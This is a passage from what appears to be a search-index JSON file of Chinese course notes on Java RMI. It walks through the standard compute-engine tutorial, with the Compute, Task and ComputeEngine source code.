\u7f16\u8bd1\u6e90\u6587\u4ef6 \u4f7f\u7c7b\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee \u542f\u52a8\u5e94\u7528\u7a0b\u5e8f","title":"3.4. \u4f7f\u7528RMI\u521b\u5efa\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#341","text":"\u9996\u5148\uff0c\u786e\u5b9a\u60a8\u7684\u5e94\u7528\u7a0b\u5e8f\u4f53\u7cfb\u7ed3\u6784\uff0c\u5305\u62ec\u54ea\u4e9b\u7ec4\u4ef6\u662f\u672c\u5730\u5bf9\u8c61\uff0c\u54ea\u4e9b\u7ec4\u4ef6\u53ef\u4ee5\u8fdc\u7a0b\u8bbf\u95ee\u3002\u8fd9\u4e2a\u6b65\u9aa4\u5305\u62ec: \u5b9a\u4e49\u8fdc\u7a0b\u63a5\u53e3 \u3002\u8fdc\u7a0b\u63a5\u53e3\u6307\u5b9a\u5ba2\u6237\u7aef\u53ef\u4ee5\u8fdc\u7a0b\u8c03\u7528\u7684\u65b9\u6cd5\u3002\u5ba2\u6237\u7aef\u9762\u5411\u8fdc\u7a0b\u63a5\u53e3\u7f16\u7a0b\uff0c\u800c\u4e0d\u662f\u9762\u5411\u90a3\u4e9b\u63a5\u53e3\u7684\u5b9e\u73b0\u7c7b\u3002\u8fd9\u4e9b\u63a5\u53e3\u7684\u8bbe\u8ba1\u5305\u62ec\u5c06\u7528\u4f5c\u8fd9\u4e9b\u65b9\u6cd5\u7684\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u5bf9\u8c61\u7c7b\u578b\u7684\u786e\u5b9a\u3002\u5982\u679c\u8fd9\u4e9b\u63a5\u53e3\u6216\u7c7b\u4e2d\u7684\u4efb\u4f55\u4e00\u4e2a\u8fd8\u4e0d\u5b58\u5728\uff0c\u60a8\u4e5f\u9700\u8981\u5b9a\u4e49\u5b83\u4eec\u3002 \u5b9e\u73b0\u8fdc\u7a0b\u5bf9\u8c61 \u3002\u8fdc\u7a0b\u5bf9\u8c61\u5fc5\u987b\u5b9e\u73b0\u4e00\u4e2a\u6216\u591a\u4e2a\u8fdc\u7a0b\u63a5\u53e3\u3002\u8fdc\u7a0b\u5bf9\u8c61\u7c7b\u53ef\u4ee5\u5305\u62ec\u4ec5\u5728\u672c\u5730\u53ef\u7528\u7684\u5176\u4ed6\u63a5\u53e3\u548c\u65b9\u6cd5\u7684\u5b9e\u73b0\u3002\u5982\u679c\u8981\u5c06\u4efb\u4f55\u672c\u5730\u7684\u7c7b\u4f5c\u4e3a\u8fd9\u4e9b\u65b9\u6cd5\u7684\u53c2\u6570\u6216\u8fd4\u56de\u503c\u4f7f\u7528\uff0c\u90a3\u4e48\u8fd9\u4e9b\u672c\u5730\u7684\u7c7b\u4e5f\u5fc5\u987b\u5b9e\u73b0\u5b83\u4eec\u3002 \u5b9e\u73b0\u5ba2\u6237\u7aef \u3002\u4f7f\u7528\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5ba2\u6237\u7aef\u53ef\u4ee5\u5728\u5b9a\u4e49\u8fdc\u7a0b\u63a5\u53e3\u4e4b\u540e\u7684\u4efb\u4f55\u65f6\u5019\u5b9e\u73b0\uff0c\u5305\u62ec\u5728\u90e8\u7f72\u8fdc\u7a0b\u5bf9\u8c61\u4e4b\u540e\u3002","title":"3.4.1. \u8bbe\u8ba1\u548c\u5b9e\u73b0\u5e94\u7528\u7a0b\u5e8f\u7ec4\u4ef6"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#342","text":"\u4e0e\u4efb\u4f55 Java \u7a0b\u5e8f\u4e00\u6837\uff0c\u4f7f\u7528 javac \u7f16\u8bd1\u5668\u7f16\u8bd1\u6e90\u6587\u4ef6\u3002\u6e90\u6587\u4ef6\u5305\u542b\u8fdc\u7a0b\u63a5\u53e3\u7684\u58f0\u660e\u3001\u5b83\u4eec\u7684\u5b9e\u73b0\u3001\u4efb\u4f55\u5176\u4ed6\u670d\u52a1\u7aef\u7c7b\u548c\u5ba2\u6237\u7aef\u7c7b\u3002 \u6ce8 :\u5bf9\u4e8eJava\u5e73\u53f0\u4e4b\u524d\u7684\u7248\u672c\uff0c\u5373\u6807\u51c6\u72485.0\uff0c\u901a\u8fc7\u4f7f\u7528 rmic \u7f16\u8bd1\u5668\u6784\u5efa\u5b58\u6839\u7c7b\u9700\u8981\u4e00\u4e2a\u989d\u5916\u7684\u6b65\u9aa4\u3002\u7136\u800c\uff0c\u8fd9\u4e00\u6b65\u5df2\u7ecf\u6ca1\u6709\u5fc5\u8981\u4e86\u3002","title":"3.4.2. \u7f16\u8bd1\u6e90\u6587\u4ef6"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#343","text":"\u5728\u6b64\u6b65\u9aa4\u4e2d\uff0c\u4f60\u5c06\u4f7f\u67d0\u4e9b\u7c7b\u5b9a\u4e49\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\uff0c\u4f8b\u5982\u8fdc\u7a0b\u63a5\u53e3\u53ca\u5176\u5173\u8054\u7c7b\u578b\u7684\u5b9a\u4e49\uff0c\u4ee5\u53ca\u9700\u8981\u4e0b\u8f7d\u5230\u5ba2\u6237\u7aef\u6216\u670d\u52a1\u5668\u7684\u7c7b\u7684\u5b9a\u4e49\u3002\u7c7b\u5b9a\u4e49\u901a\u5e38\u901a\u8fc7 web \u670d\u52a1\u5668\u8fdb\u884c\u7f51\u7edc\u8bbf\u95ee\u3002","title":"3.4.3. \u4f7f\u7c7b\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#344","text":"\u542f\u52a8\u5e94\u7528\u7a0b\u5e8f\u5305\u62ec\u8fd0\u884c RMI \u8fdc\u7a0b\u5bf9\u8c61\u6ce8\u518c\u8868\u3001\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u3002 \u672c\u8282\u7684\u5176\u4f59\u90e8\u5206\u5c06\u4ecb\u7ecd\u7528\u4e8e\u521b\u5efa\u8ba1\u7b97\u5f15\u64ce\u7684\u6b65\u9aa4\u3002","title":"3.4.4. \u542f\u52a8\u5e94\u7528\u7a0b\u5e8f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#35","text":"\u4e0b\u9762\u7684\u5185\u5bb9\u4e3b\u8981\u4ecb\u7ecd\u4e00\u4e2a\u7b80\u5355\u4f46\u529f\u80fd\u5f3a\u5927\u7684\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\uff0c\u5373\u8ba1\u7b97\u5f15\u64ce\u3002\u8ba1\u7b97\u5f15\u64ce\u662f\u670d\u52a1\u5668\u4e0a\u7684\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u5b83\u4ece\u5ba2\u6237\u7aef\u83b7\u53d6\u4efb\u52a1\uff0c\u8fd0\u884c\u4efb\u52a1\u5e76\u8fd4\u56de\u4efb\u4f55\u7ed3\u679c\u3002\u4efb\u52a1\u5728\u670d\u52a1\u5668\u8fd0\u884c\u7684\u673a\u5668\u4e0a\u8fd0\u884c\u3002\u8fd9\u79cd\u7c7b\u578b\u7684\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u8bb8\u591a\u5ba2\u6237\u7aef\u673a\u5668\u80fd\u591f\u4f7f\u7528\u7279\u522b\u5f3a\u5927\u7684\u673a\u5668\u6216\u5177\u6709\u4e13\u95e8\u786c\u4ef6\u7684\u673a\u5668\u3002 \u8ba1\u7b97\u5f15\u64ce\u7684\u65b0\u9896\u4e4b\u5904\u5728\u4e8e\uff0c\u5728\u7f16\u5199\u6216\u542f\u52a8\u8ba1\u7b97\u5f15\u64ce\u65f6\uff0c\u4e0d\u9700\u8981\u5b9a\u4e49\u5b83\u8fd0\u884c\u7684\u4efb\u52a1\u3002\u53ef\u4ee5\u5728\u4efb\u4f55\u65f6\u5019\u521b\u5efa\u65b0\u7c7b\u578b\u7684\u4efb\u52a1\uff0c\u7136\u540e\u5c06\u5176\u4ea4\u7ed9\u8981\u8fd0\u884c\u7684\u8ba1\u7b97\u5f15\u64ce\u3002\u4efb\u52a1\u7684\u60df\u4e00\u8981\u6c42\u662f\u5176\u7c7b\u5b9e\u73b0\u7279\u5b9a\u7684\u63a5\u53e3\u3002\u5b8c\u6210\u4efb\u52a1\u6240\u9700\u7684\u4ee3\u7801\u53ef\u4ee5\u7531RMI\u7cfb\u7edf\u4e0b\u8f7d\u5230\u8ba1\u7b97\u5f15\u64ce\u3002\u7136\u540e\uff0c\u8ba1\u7b97\u5f15\u64ce\u8fd0\u884c\u4efb\u52a1\uff0c\u4f7f\u7528\u6b63\u5728\u8fd0\u884c\u8ba1\u7b97\u5f15\u64ce\u7684\u673a\u5668\u4e0a\u7684\u8d44\u6e90\u3002 \u6267\u884c\u4efb\u610f\u4efb\u52a1\u7684\u80fd\u529b\u662f\u7531 Java \u5e73\u53f0\u7684\u52a8\u6001\u7279\u6027\u6240\u652f\u6301\u7684\uff0c\u5b83\u901a\u8fc7RMI\u6269\u5c55\u5230\u7f51\u7edc\u3002 RMI \u52a8\u6001\u5730\u5c06\u4efb\u52a1\u4ee3\u7801\u52a0\u8f7d\u5230\u8ba1\u7b97\u5f15\u64ce\u7684 Java \u865a\u62df\u673a\u4e2d\uff0c\u5e76\u5728\u4e0d\u77e5\u9053\u5b9e\u73b0\u4efb\u52a1\u7684\u7c7b\u7684\u60c5\u51b5\u4e0b\u8fd0\u884c\u4efb\u52a1\u3002\u8fd9\u79cd\u80fd\u591f\u52a8\u6001\u4e0b\u8f7d\u4ee3\u7801\u7684\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u88ab\u79f0\u4e3a\u57fa\u4e8e\u884c\u4e3a\u7684\u5e94\u7528\u7a0b\u5e8f\u3002\u6b64\u7c7b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u9700\u8981\u5b8c\u6574\u7684\u542f\u7528\u4ee3\u7406\u7684\u57fa\u7840\u8bbe\u65bd\u3002\u5bf9\u4e8eRMI\uff0c\u8fd9\u6837\u7684\u5e94\u7528\u7a0b\u5e8f\u662f Java \u5e73\u53f0\u4e0a\u5206\u5e03\u5f0f\u8ba1\u7b97\u7684\u57fa\u672c\u673a\u5236\u7684\u4e00\u90e8\u5206\u3002","title":"3.5. \u6784\u5efa\u4e00\u4e2a\u901a\u7528\u7684\u8ba1\u7b97\u5f15\u64ce"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#4-rmi","text":"\u670d\u52a1\u5668\u4ece\u5ba2\u6237\u7aef\u63a5\u6536\u4efb\u52a1\uff0c\u8fd0\u884c\u4efb\u52a1\u5e76\u8fd4\u56de\u4efb\u4f55\u7ed3\u679c\u3002\u670d\u52a1\u5668\u4ee3\u7801\u7531\u63a5\u53e3\u548c\u7c7b\u7ec4\u6210\u3002\u63a5\u53e3\u5b9a\u4e49\u4e86\u53ef\u4ee5\u4ece\u5ba2\u6237\u7aef\u8c03\u7528\u7684\u65b9\u6cd5\u3002\u672c\u8d28\u4e0a\uff0c\u63a5\u53e3\u5b9a\u4e49\u4e86\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5ba2\u6237\u7aef\u89c6\u56fe\u3002\u7c7b\u5b9a\u4e49\u4e86\u65b9\u6cd5\u7684\u5b9e\u73b0\u7ec6\u8282\u3002 \u8fd9\u4e00\u7ae0\u4e3b\u8981\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206 Designing a Remote Interface \u7b2c\u4e00\u90e8\u5206\u5b9a\u4e49\u4e86 Compute \u63a5\u53e3\uff0c\u5b83\u63d0\u4f9b\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u8fde\u63a5\u3002\u901a\u8fc7\u8fd9\u4e00\u8282\u5185\u5bb9\uff0c\u4f60\u8fd8\u5c06\u4e86\u89e3\u652f\u6301\u8fd9\u79cd\u901a\u4fe1\u7684 RMI API \u3002 Implementing a Remote Interface \u7b2c\u4e8c\u90e8\u5206\u5c06\u8ba8\u8bba\u5982\u4f55\u5b9e\u73b0 Compute \u63a5\u53e3\u7684\u7c7b\uff0c\u4ece\u800c\u5b9e\u73b0\u8fdc\u7a0b\u5bf9\u8c61\u3002\u8be5\u7c7b\u8fd8\u63d0\u4f9b\u7ec4\u6210\u670d\u52a1\u5668\u7a0b\u5e8f\u7684\u5176\u4f59\u4ee3\u7801\uff0c\u5305\u62ec\u521b\u5efa\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u4f8b\u3001\u5411RMI\u6ce8\u518c\u8868\u6ce8\u518c\u8be5\u5bf9\u8c61\u5e76\u8bbe\u7f6e\u5b89\u5168\u7ba1\u7406\u5668\u7684 main \u65b9\u6cd5\u3002","title":"4. \u5982\u4f55\u5b9e\u73b0\u4e00\u4e2a RMI \u670d\u52a1\u5668"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#41","text":"\u8ba1\u7b97\u5f15\u64ce\u7684\u6838\u5fc3\u662f\u534f\u8bae\uff0c\u8be5\u534f\u8bae\u4f7f\u4efb\u52a1\u53ef\u4ee5\u63d0\u4ea4\u5230\u8ba1\u7b97\u5f15\u64ce\uff0c\u8ba1\u7b97\u5f15\u64ce\u53ef\u4ee5\u8fd0\u884c\u8fd9\u4e9b\u4efb\u52a1\uff0c\u5e76\u5c06\u8fd9\u4e9b\u4efb\u52a1\u7684\u7ed3\u679c\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\u3002\u8be5\u534f\u8bae\u5728\u8ba1\u7b97\u5f15\u64ce\u652f\u6301\u7684\u63a5\u53e3\u4e2d\u8868\u793a\u3002 \u4e0b\u56fe\u8bf4\u660e\u4e86\u6b64\u534f\u8bae\u7684\u8fdc\u7a0b\u901a\u4fe1\u3002 \\text{Figure 4. \u8fdc\u7a0b\u901a\u4fe1} \u6bcf\u4e2a\u63a5\u53e3\u90fd\u5305\u542b\u4e00\u4e2a\u65b9\u6cd5\u3002 \u8ba1\u7b97\u5f15\u64ce\u7684\u8fdc\u7a0b\u63a5\u53e3 Compute \u4f7f\u4efb\u52a1\u53ef\u4ee5\u63d0\u4ea4\u5230\u5f15\u64ce\u3002 \u5ba2\u6237\u7aef\u63a5\u53e3 Task \u5b9a\u4e49\u4e86\u8ba1\u7b97\u5f15\u64ce\u5982\u4f55\u6267\u884c\u63d0\u4ea4\u7684\u4efb\u52a1\u3002 compute.Compute \u63a5\u53e3\u5b9a\u4e49\u4e86\u53ef\u8fdc\u7a0b\u8bbf\u95ee\u7684\u90e8\u5206\uff0c\u5373\u8ba1\u7b97\u5f15\u64ce\u672c\u8eab\u3002 \u8fd9\u662f Compute \u63a5\u53e3\u7684\u6e90\u4ee3\u7801\uff1a package compute; import java.rmi.Remote; import java.rmi.RemoteException; public interface Compute extends Remote { <T> T executeTask(Task<T> t) throws RemoteException; } \u901a\u8fc7\u6269\u5c55\u63a5\u53e3 java.rmi.Remote \uff0c Compute \u63a5\u53e3\u5c06\u5176\u81ea\u8eab\u6807\u8bc6\u4e3a\u53ef\u4ee5\u4ece\u53e6\u4e00\u4e2a Java \u865a\u62df\u673a\u8c03\u7528\u5176\u65b9\u6cd5\u7684\u63a5\u53e3\u3002 \u5b9e\u73b0\u6b64\u63a5\u53e3\u7684\u4efb\u4f55\u5bf9\u8c61\u90fd\u53ef\u4ee5\u662f\u8fdc\u7a0b\u5bf9\u8c61\u3002 \u4f5c\u4e3a\u8fdc\u7a0b\u63a5\u53e3\u7684\u6210\u5458\uff0c executeTask \u65b9\u6cd5\u662f\u4e00\u79cd\u8fdc\u7a0b\u65b9\u6cd5\u3002 \u56e0\u6b64\uff0c\u5fc5\u987b\u5c06\u6b64\u65b9\u6cd5\u5b9a\u4e49\u4e3a\u80fd\u591f\u629b\u51fa java.rmi.RemoteException \u3002 RMI \u7cfb\u7edf\u4ece\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528\u4e2d\u629b\u51fa\u6b64\u5f02\u5e38\uff0c\u4ee5\u8868\u660e\u53d1\u751f\u901a\u4fe1\u6545\u969c\u6216\u534f\u8bae\u9519\u8bef\u3002 RemoteException \u662f\u4e00\u4e2a\u8981\u6c42\u88ab\u6355\u83b7\u7684\u5f02\u5e38\uff0c\u56e0\u6b64\u4efb\u4f55\u8c03\u7528\u8fdc\u7a0b\u65b9\u6cd5\u7684\u4ee3\u7801\u90fd\u9700\u8981\u901a\u8fc7\u6355\u83b7\u8be5\u5f02\u5e38\u6216\u5728\u5176 throws \u5b50\u53e5\u4e2d\u58f0\u660e\u8be5\u5f02\u5e38\u6765\u5bf9\u5176\u8fdb\u884c\u5904\u7406\u3002 \u8ba1\u7b97\u5f15\u64ce\u6240\u9700\u7684\u7b2c\u4e8c\u4e2a\u63a5\u53e3\u662f Task \u63a5\u53e3\uff0c\u5b83\u662f Compute \u63a5\u53e3\u4e2d executeTask \u65b9\u6cd5\u7684\u53c2\u6570\u7c7b\u578b\u3002 compute.Task \u63a5\u53e3\u5b9a\u4e49\u4e86\u8ba1\u7b97\u5f15\u64ce\u4e0e\u5176\u9700\u8981\u5b8c\u6210\u7684\u5de5\u4f5c\u4e4b\u95f4\u7684\u63a5\u53e3\uff0c\u4ece\u800c\u63d0\u4f9b\u4e86\u5f00\u59cb\u5de5\u4f5c\u7684\u65b9\u5f0f\u3002 \u8fd9\u662f Task \u754c\u9762\u7684\u6e90\u4ee3\u7801\uff1a package compute; public interface Task<T> { T execute(); } Task \u63a5\u53e3\u5b9a\u4e49\u4e86\u4e00\u4e2a\u65b9\u6cd5 execute \uff0c\u5b83\u6ca1\u6709\u53c2\u6570\uff0c\u4e5f\u4e0d\u4f1a\u5f15\u53d1\u5f02\u5e38\u3002 \u56e0\u4e3a\u8be5\u63a5\u53e3\u672a\u6269\u5c55 Remote \uff0c\u6240\u4ee5\u8be5\u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5\u4e0d\u9700\u8981\u5728\u5176 throws \u5b50\u53e5\u4e2d\u5217\u51fa java.rmi.RemoteException \u3002 Task \u63a5\u53e3\u5177\u6709\u7c7b\u578b\u53c2\u6570 T \uff0c\u5b83\u8868\u793a\u4efb\u52a1\u8ba1\u7b97\u7684\u7ed3\u679c\u7c7b\u578b\u3002 \u6b64\u63a5\u53e3\u7684 execute \u65b9\u6cd5\u8fd4\u56de\u8ba1\u7b97\u7ed3\u679c\uff0c\u56e0\u6b64\u5176\u8fd4\u56de\u7c7b\u578b\u4e3a T \u3002 \u53cd\u8fc7\u6765\uff0c Compute \u63a5\u53e3\u7684 executeTask \u65b9\u6cd5\u8fd4\u56de\u4f20\u9012\u7ed9\u5b83\u7684 Task \u5b9e\u4f8b\u7684\u6267\u884c\u7ed3\u679c\u3002 \u56e0\u6b64\uff0c executeTask \u65b9\u6cd5\u5177\u6709\u81ea\u5df1\u7684\u7c7b\u578b\u53c2\u6570 T \uff0c\u8be5\u53c2\u6570\u5c06\u5176\u81ea\u8eab\u7684\u8fd4\u56de\u7c7b\u578b\u4e0e\u4f20\u9012\u7684 Task \u5b9e\u4f8b\u7684\u7ed3\u679c\u7c7b\u578b\u76f8\u5173\u8054\u3002 RMI \u4f7f\u7528 Java \u5bf9\u8c61\u5e8f\u5217\u5316\u673a\u5236\u5728 Java \u865a\u62df\u673a\u4e4b\u95f4\u6309\u503c\u4f20\u8f93\u5bf9\u8c61\u3002 \u5bf9\u4e8e\u88ab\u89c6\u4e3a\u53ef\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\uff0c\u5176\u7c7b\u5fc5\u987b\u5b9e\u73b0 java.io.Serializable \u6807\u8bb0\u63a5\u53e3\u3002 \u56e0\u6b64\uff0c\u5b9e\u73b0 Task \u63a5\u53e3\u7684\u7c7b\u4e5f\u5fc5\u987b\u5b9e\u73b0 Serializable \uff0c\u7528\u4e8e\u4efb\u52a1\u7ed3\u679c\u7684\u5bf9\u8c61\u7684\u7c7b\u4e5f\u5fc5\u987b\u5b9e\u73b0\u3002 \u53ea\u8981\u4efb\u52a1\u7c7b\u578b\u662f Task \u7684\u5b9e\u73b0\uff0c\u5c31\u53ef\u4ee5\u7531 Compute \u5bf9\u8c61\u8fd0\u884c\u5404\u79cd\u4efb\u52a1\u3002\u5b9e\u73b0\u6b64\u63a5\u53e3\u7684\u7c7b\u53ef\u4ee5\u5305\u542b\u4efb\u52a1\u8ba1\u7b97\u6240\u9700\u7684\u4efb\u4f55\u6570\u636e\u4ee5\u53ca\u8ba1\u7b97\u6240\u9700\u7684\u4efb\u4f55\u5176\u4ed6\u65b9\u6cd5\u3002 \u8fd9\u5c31\u662f RMI \u5982\u4f55\u4f7f\u8fd9\u79cd\u7b80\u5355\u7684\u8ba1\u7b97\u5f15\u64ce\u6210\u4e3a\u53ef\u80fd\u3002\u56e0\u4e3a RMI \u53ef\u4ee5\u5047\u5b9a Task \u5bf9\u8c61\u662f\u7528 Java \u7f16\u7a0b\u8bed\u8a00\u7f16\u5199\u7684\uff0c\u6240\u4ee5 RMI \u5c06\u6839\u636e\u9700\u8981\u5c06\u8ba1\u7b97\u5f15\u64ce\u5148\u524d\u672a\u77e5\u7684 Task \u5bf9\u8c61\u7684\u5b9e\u73b0\u4e0b\u8f7d\u5230\u8ba1\u7b97\u5f15\u64ce\u7684 Java \u865a\u62df\u673a\u4e2d\u3002\u6b64\u529f\u80fd\u4f7f\u8ba1\u7b97\u5f15\u64ce\u7684\u5ba2\u6237\u7aef\u53ef\u4ee5\u5b9a\u4e49\u8981\u5728\u670d\u52a1\u5668\u8ba1\u7b97\u673a\u4e0a\u8fd0\u884c\u7684\u65b0\u4efb\u52a1\uff0c\u800c\u65e0\u9700\u5728\u8be5\u8ba1\u7b97\u673a\u4e0a\u663e\u5f0f\u5b89\u88c5\u4ee3\u7801\u3002 \u7531 ComputeEngine \u7c7b\u5b9e\u73b0\u7684\u8ba1\u7b97\u5f15\u64ce\u5b9e\u73b0 Compute \u63a5\u53e3\uff0c\u4ece\u800c\u5141\u8bb8\u901a\u8fc7\u8c03\u7528\u5176 executeTask \u65b9\u6cd5\u5c06\u4e0d\u540c\u7684\u4efb\u52a1\u63d0\u4ea4\u7ed9\u5b83\u3002\u4f7f\u7528\u4efb\u52a1\u7684 execute \u65b9\u6cd5\u5b9e\u73b0\u8fd0\u884c\u8fd9\u4e9b\u4efb\u52a1\uff0c\u5e76\u5c06\u7ed3\u679c\u8fd4\u56de\u5230\u8fdc\u7a0b\u5ba2\u6237\u7aef\u3002","title":"4.1. \u8bbe\u8ba1\u8fdc\u7a0b\u63a5\u53e3"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#42","text":"\u672c\u8282\u8ba8\u8bba\u4e3a\u8ba1\u7b97\u5f15\u64ce\u5b9e\u73b0\u7c7b\u7684\u4efb\u52a1\u3002 \u901a\u5e38\uff0c\u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3\u7684\u7c7b\u81f3\u5c11\u5e94\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a \u58f0\u660e\u8981\u88ab\u5b9e\u73b0\u7684\u8fdc\u7a0b\u63a5\u53e3 \u4e3a\u6bcf\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u5b9a\u4e49\u6784\u9020\u51fd\u6570 \u63d0\u4f9b\u8fdc\u7a0b\u63a5\u53e3\u4e2d\u6bcf\u4e2a\u8fdc\u7a0b\u65b9\u6cd5\u7684\u5b9e\u73b0 RMI \u670d\u52a1\u5668\u7a0b\u5e8f\u9700\u8981\u521b\u5efa\u521d\u59cb\u7684\u8fdc\u7a0b\u5bf9\u8c61\u5e76\u5c06\u5176\u5bfc\u51fa\u5230 RMI \u8fd0\u884c\u65f6\uff0c\u8fd9\u4f7f\u5b83\u4eec\u53ef\u7528\u4e8e\u63a5\u6536\u4f20\u5165\u7684\u8fdc\u7a0b\u8c03\u7528\u3002 \u6b64\u8bbe\u7f6e\u8fc7\u7a0b\u53ef\u4ee5\u5c01\u88c5\u5728\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7c7b\u672c\u8eab\u7684\u65b9\u6cd5\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u5b8c\u5168\u5305\u542b\u5728\u53e6\u4e00\u4e2a\u7c7b\u4e2d\u3002 \u8bbe\u7f6e\u8fc7\u7a0b\u5e94\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a \u521b\u5efa\u5e76\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668 \u521b\u5efa\u548c\u5bfc\u51fa\u4e00\u4e2a\u6216\u591a\u4e2a\u8fdc\u7a0b\u5bf9\u8c61 \u4e3a\u4e86\u5f15\u5bfc\u76ee\u7684\uff0c\u81f3\u5c11\u5411 RMI \u6ce8\u518c\u8868\uff08\u6216\u5411\u53e6\u4e00\u4e2a\u547d\u540d\u670d\u52a1\uff0c\u4f8b\u5982\u53ef\u901a\u8fc7 Java \u547d\u540d\u548c\u76ee\u5f55\u63a5\u53e3\u8bbf\u95ee\u7684\u670d\u52a1\uff09\u6ce8\u518c\u4e00\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u3002 \u63a5\u4e0b\u6765\u662f\u8ba1\u7b97\u5f15\u64ce\u7684\u5b8c\u6574\u5b9e\u73b0\u3002 engine.ComputeEngine \u7c7b\u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3 Compute \uff0c\u5e76\u4e14\u8fd8\u5305\u62ec\u7528\u4e8e\u8bbe\u7f6e\u8ba1\u7b97\u5f15\u64ce\u7684\u4e3b\u8981\u65b9\u6cd5\u3002 \u8fd9\u662f ComputeEngine \u7c7b\u7684\u6e90\u4ee3\u7801\uff1a package engine; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; import java.rmi.server.UnicastRemoteObject; import compute.Compute; import compute.Task; public class ComputeEngine implements Compute { public ComputeEngine() { super(); } public <T> T executeTask(Task<T> t) { return t.execute(); } public static void main(String[] args) { if (System.getSecurityManager() == null) { System.setSecurityManager(new SecurityManager()); } try { String name = \"Compute\"; Compute engine = new ComputeEngine(); Compute stub = (Compute) UnicastRemoteObject.exportObject(engine, 0); Registry registry = LocateRegistry.getRegistry(); registry.rebind(name, stub); System.out.println(\"ComputeEngine bound\"); } catch (Exception e) { System.err.println(\"ComputeEngine exception:\"); e.printStackTrace(); } } } \u4ee5\u4e0b\u5404\u8282\u8ba8\u8bba\u8ba1\u7b97\u5f15\u64ce\u5b9e\u73b0\u7684\u6bcf\u4e2a\u7ec4\u4ef6\u3002","title":"4.2. \u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#421","text":"\u8ba1\u7b97\u5f15\u64ce\u7684\u5b9e\u73b0\u7c7b\u58f0\u660e\u5982\u4e0b\uff1a public class ComputeEngine implements Compute \u8be5\u58f0\u660e\u6307\u51fa\u8be5\u7c7b\u5b9e\u73b0\u4e86 Compute \u8fdc\u7a0b\u63a5\u53e3\uff0c\u56e0\u6b64\u53ef\u4ee5\u7528\u4e8e\u8fdc\u7a0b\u5bf9\u8c61\u3002 ComputeEngine 